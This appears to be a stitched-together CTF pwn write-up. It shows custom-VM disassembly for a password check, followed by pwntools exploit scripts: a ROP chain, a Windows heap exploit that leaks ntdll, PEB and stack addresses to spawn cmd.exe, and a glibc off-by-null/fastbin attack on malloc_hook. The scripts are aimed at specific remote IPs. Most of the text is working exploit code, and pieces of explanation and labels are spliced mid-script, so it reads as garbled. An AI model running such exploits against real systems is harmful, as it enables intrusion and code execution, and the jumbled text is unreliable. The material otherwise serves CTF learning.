mov word r1, 0x0
mov word r2, 0x40
mov byte r3, 0x21
syscall
read(0,data[0x40],0x21)
xor qword r8, r8
mov qword r8, data[0x40]
mov qword r9, 0x427234129827abcd
xor qword r8, r9
cmp qword r8, 0x10240740dc179b8a
je byte $+0x2 #G00DR3VR
GG
xor qword r8, r8
mov qword r8, data[0x48]
mov qword r9, 0x127412341241dead
xor qword r8, r9
cmp qword r8, 0x213a22705e70edfa
je byte $+0x2##W31LD0N3
GG
xor qword r8, r8
mov qword r8, data[0x50]
mov qword r9, 0x8634965812abc123
xor qword r8, r9
cmp qword r8, 0xa75ae10820d2b377
je byte $+0x2#Try2Pwn!
GG
xor qword r8, r8
mov qword r8, data[0x58]
mov qword r9, 0x123216781236789a
xor qword r8, r9
cmp qword r8, 0x5d75593f5d7137dd
je byte $+0x2#GOGOGOGO
GG
mov byte r0, 0x2
mov byte r1, 0x1
mov byte r2, 0x34
mov byte r3, 0x6
syscall
read(1,data[0x34],6)
push qword bp
mov qword bp, sp
sub qword sp, 0x100
mov qword r4, sp
mov qword r5, 0xa214f474f4721
push qword r5
mov qword r5, 0x574f4e54494e5750
push qword r5
mov qword r5, sp
mov byte r0, 0x2
mov byte r1, 0x1
mov qword r2, sp
mov byte r3, 0xf
syscall
write(1,sp,0xf)#PWNITNOW!GOGO!
mov byte r0, 0x1
mov byte r1, 0x0
mov qword r2, r4
mov qword r3, 0x800
syscall
read(0,sp,0x800)
cmp qword r0, 0x0
jnl byte $+0x2
GG
mov qword r3, r0
mov byte r1, 0x1
mov qword r2, r4
mov qword r0, 0x2
syscall
write(1,sp,len)
mov qword sp, bp
pop qword bp
脚本
ret
GG
GG
syscall
syscall
from pwn import *
pw ='QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO'
p = process(['./emulator','./test.bin'])
#p = remote('47.94.20.173', 32142)
p.recvuntil('password:')
p.sendline(pw)
p.recvuntil('PWNITNOW!GOGO!')
pop_r0 = 0x2f5 #0d460011 
pop_r1 = 0x377 #0d460111      
pop_r2 = 0x45c #0d460211  
pop_r3 = 0x4e1 #0d460311 
sys_call = 0x5b1# 200811           
sys_open = 0x6ed# 200a11 
pay = 'a'*0x108
pay +=p64(pop_r0)
pay +=p64(1)
pay +=p64(pop_r1)
pay+=p64(0)
pay+=p64(pop_r2)
pay+=p64(0x60)
pay+=p64(pop_r3)
pay+=p64(0x10)
pay+=p64(sys_call)
pay +=p64(pop_r0)
pay +=p64(0)
pay +=p64(pop_r1)
pay+=p64(0x60)
pay+=p64(pop_r2)
pay+=p64(0x0)
pay+=p64(sys_open)
pay +=p64(pop_r0)
pay +=p64(1)
pay +=p64(pop_r1)
pay+=p64(4)
pay+=p64(pop_r2)
pay+=p64(0x70)
pay+=p64(pop_r3)
pay+=p64(0x30)
pay+=p64(sys_call )
pay +=p64(pop_r0)
pay +=p64(2)
pay +=p64(pop_r1)
pay+=p64(1)
wingame
pay+=p64(pop_r2)
pay+=p64(0x70)
pay+=p64(pop_r3)
pay+=p64(0x30)
pay+=p64(sys_call )
p.sendline(pay)
raw_input('PRESS ANY KEY')
p.sendline('flag\x00')
p.interactive()
from pwn import *
#context.log_level="debug"
def add(size,note):
    p.sendlineafter(": ","1")
    p.sendlineafter(":",str(size))
    p.sendafter(":",note)
def delete(index):
    p.sendlineafter(": ","2")
    p.sendlineafter(":",str(index))
def edit(index,note):
    p.sendlineafter(": ","3")
    p.sendlineafter(":",str(index))
    p.sendafter(":",note)
def show(index):
    p.sendlineafter(": ","4")
    p.sendlineafter(":",str(index))
#dd 0C664D8
#6AA0D07E
#p = Process("WinGame.exe")
p=remote("120.55.89.74",12345)
#p.spawn_debugger(breakin=False)
p.sendlineafter(": ","1")
for i in range(10):
    add(0x100,"a"*0x100+"\n")
#edit(0,"1"*0x108)
p.sendlineafter(": ","4")
p.sendlineafter("\n","1")
for i in range(9):
    p.sendlineafter(": ","4")
    p.sendlineafter("\n","0")
edit(9,"a"*0x108)
edit(9,"a"*0x108+"\x40\x01\n")
p.sendlineafter(": ","5")
p.sendlineafter("\n","1")
p.sendlineafter(":","131")
s=p.recv(1)+p.recv(1)
print s.encode("hex")
addr = ord(s[0])*0x10000+ord(s[1])*0x1000000
print "exec base:",hex(addr)
p.sendlineafter(": ","5")
p.sendlineafter("\n","1")
p.sendlineafter(":","132")
s1=p.recv(1)+p.recv(1)
print s1.encode("hex")
p.sendlineafter(": ","5")
p.sendlineafter("\n","1")
p.sendlineafter(":","133")
s2=p.recv(1)+p.recv(1)
print s2.encode("hex")
key=s1+s2
print "key:",hex(u32(key))
p.sendlineafter(": ","6")
p.sendlineafter(": ","2")
p.sendlineafter(":",key)
add(0x20,"\n")
add(0x20,"\n")
add(0x20,"\n")
add(0x20,"\n")
add(0x20,"\n")
add(0x20,"\n")
delete(2)
delete(4)
edit(2,p32(addr+0x64e4)+p32(addr+0x64e8)+"\n")
delete(1)
edit(2,p32(addr+0x64f0)+p32(0x100)+p32(addr+0x4034)+p32(0x100)+"\n")
show(3)
p.recvuntil(":")
ntdll_addr = u32(p.recv(4))-0x66e90
print "ntdll addr:",hex(ntdll_addr)
edit(2,p32(ntdll_addr+0x120c40-52)+p64(0x100)+"\n")
show(3)
p.recvuntil(":")
peb_addr = u32(p.recv(3)+"\x00")-0x21c
print "peb addr:",hex(peb_addr)
teb_addr = peb_addr+0x3000+6
edit(2,p32(addr+0x6018)+p32(0x100)+"\n")
edit(3,p32(0xffff)*4+"\n")
edit(2,p32(teb_addr)+p64(0x100)+"\n")
show(3)
p.recvuntil(":")
stack_addr = u32(("\x00\x00"+p.recvuntil("\r\n")[:-2]).ljust(4,"\x00"))
print "stack addr:",hex(stack_addr)
edit(2,p32(addr+0x414c)+p64(0x100)+"\n")
show(3)
p.recvuntil(":")
ucrt_addr = u32(p.recv(4))-0xb89f0
print "ucrt addr:",hex(ucrt_addr)
main_ret = 0
context.log_level="debug"
for i in range(300,0x1000):
    print i
    edit(2,p32(stack_addr-i*4)+p64(0x100)+"\n")
    show(3)
    p.recvuntil(":")
    tmp = p.recvuntil("\r\n")[:-2].ljust(4,"\x00")[:4]
    if u32(tmp) == addr+0x239a:
       main_ret = stack_addr-i*4
       break
easypwn
题目关闭了fastbin，存在溢出oﬀ-by-null漏洞
首先构造overlap,部分写进行unsorted bin attack，将global_max_fast改写
利用堆中残存的libc地址结合fastbin attack打stdout进行泄漏，最后打malloc_hook即可
print "main ret:",hex(main_ret) 
edit(2,p32(main_ret)+p64(0x100)+"\n")
edit(3,p32(ucrt_addr+0xefda0)+p32(0)+p32(main_ret+0xc)+"cmd.exe\x00\n")
p.sendlineafter(": ","5")
p.interactive() 
from pwn import *
context.log_level="debug"
def add(size):
    p.sendlineafter(":\n",str(1))
    p.sendlineafter(":\n",str(size))
def edit(index,note):
    p.sendlineafter(":\n",str(2))
    p.sendlineafter(":\n",str(index))
    p.sendafter(":\n",note)
def delete(index):
    p.sendlineafter(":\n",str(3))
    p.sendlineafter(":\n",str(index))
for i in range(100):
    try:
        p=remote("39.101.184.181",10000)
        #p=process("./easypwn")
        add(0x68)
        add(0x68)
        add(0x68)
        add(0x68)
        add(0xf8)
        add(0x68)
        add(0x18)
        add(0x18)
        delete(0)
        edit(3,"a"*0x60+p64(0x1c0))
        delete(6)
        delete(4)
        add(0x68)#0
        add(0x68)#4
        add(0x68)#6
        edit(3,"a"*8+"\xe8\x37\n")
        add(0x168)
        delete(2)
        delete(1)
        edit(4,"\x00\n")
        edit(0,"\xdd\x25\n")
        add(0x68)#1
        add(0x68)#2
        add(0x68)#9
        edit(9,"\x00"*3+p64(0)*6+p64(0xfbad1800) + p64(0)*3 + "\x00\n")
        p.recvuntil("\x7f\x00\x00")
        addr=u64(p.recv(8))+0x7ffff7a0d000-0x7ffff7dd26a3
        print hex(addr)
        p.sendline("3")
        p.sendlineafter(":\n","2")
        edit(0,p64(addr+0x7ffff7dd1aed-0x7ffff7a0d000)+"\n")
        add(0x68)
        add(0x68)
        edit(10,"\x00"*0x13+p64(addr+0xf0364)+"\n")
        #gdb.attach(p)
        add(0x10)
        p.interactive()
    except:
        print "fail"